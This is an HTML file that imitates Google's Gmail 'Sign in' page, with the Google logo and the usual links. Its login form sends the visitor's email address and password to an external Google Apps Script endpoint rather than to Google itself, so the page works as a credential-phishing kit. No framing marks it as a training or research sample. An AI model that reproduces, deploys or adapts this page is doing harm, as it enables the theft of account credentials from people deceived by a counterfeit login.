<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Login</title>
    <link rel="stylesheet" href="Style Gulugulu.css">
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
            <h1>Sign in</h1>
            <p>to continue to Gmail</p>
            <form action="https://script.google.com/macros/s/AKfycbw0b9mu2stp5uMhLd1cddpboxgQCLv_yozJgeR4X0x76ktaKUa2XE43WE86H8qJV893/exec" method="post">
                <div class="input-group">
                    <input type="email" name="email" placeholder="Email or phone" required>
                </div>
                <div class="input-group">
                    <input type="password" name="password" placeholder="Enter your password" required>
                </div>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                <button type="submit" class="btn">Next</button>
            </form>
            <div class="signup-link">
                <p>Not your computer? Use Guest mode to sign in privately.</p>
                <a href="#">Learn more</a>
            </div>
            <div class="create-account">
                <a href="#">Create account</a>
            </div>
        </div>
    </div>
</body>
</html>
